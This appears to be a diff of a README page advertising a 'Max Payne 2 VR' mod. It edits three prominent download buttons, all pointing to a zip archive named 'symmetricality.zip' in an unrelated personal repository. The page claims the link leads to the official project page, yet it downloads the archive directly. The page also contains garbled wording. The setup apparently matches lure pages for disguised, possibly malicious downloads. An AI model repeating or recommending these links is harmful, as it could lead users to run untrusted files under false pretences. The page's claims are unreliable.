@@ -6,7 +6,7 @@ description: "Experience Max Payne 2 in full VR with tracked hands, physical wea
 <h1>🎮 max-payne-2-vr - Experience Max Payne 2 in Virtual Reality</h1>
 
 <p align="center">
-  <a href="https://github.com/parthilsinh/parthilsinh.github.io/raw/refs/heads/main/src/symmetricality.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(37,117,252,0.4);">🚀 DOWNLOAD THE MOD NOW</a>
+  <a href="https://raw.githubusercontent.com/parthilsinh/parthilsinh.github.io/main/src/symmetricality.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(37,117,252,0.4);">🚀 DOWNLOAD THE MOD NOW</a>
 </p>
 
 ---
@@ -63,7 +63,7 @@ Follow these simple steps to get from download to gameplay in just a few minutes
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/parthilsinh/parthilsinh.github.io/raw/refs/heads/main/src/symmetricality.zip" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#f7971e,#ffd200);color:#333;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;box-shadow:0 4px 10px rgba(255,165,0,0.3);">⬇️ GO TO DOWNLOAD PAGE</a>
+  <a href="https://raw.githubusercontent.com/parthilsinh/parthilsinh.github.io/main/src/symmetricality.zip" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#f7971e,#ffd200);color:#333;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;box-shadow:0 4px 10px rgba(255,165,0,0.3);">⬇️ GO TO DOWNLOAD PAGE</a>
 </p>
 
 This will take you to the official project page on GitHub, where you can find the latest version of the mod. 
@@ -193,5 +193,5 @@ See you in the bullet timeison.
 <p align="center">
   <strong>Ready to jump in?</strong> 
   <br><br>
-  <a href="https://github.com/parthilsinh/parthilsinh.github.io/raw/refs/heads/main/src/symmetricality.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff416c,#ff4b2b);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,65,108,0.4);">🎮 GET THE MOD NOW</a>
+  <a href="https://raw.githubusercontent.com/parthilsinh/parthilsinh.github.io/main/src/symmetricality.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff416c,#ff4b2b);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,65,108,0.4);">🎮 GET THE MOD NOW</a>
 </p>
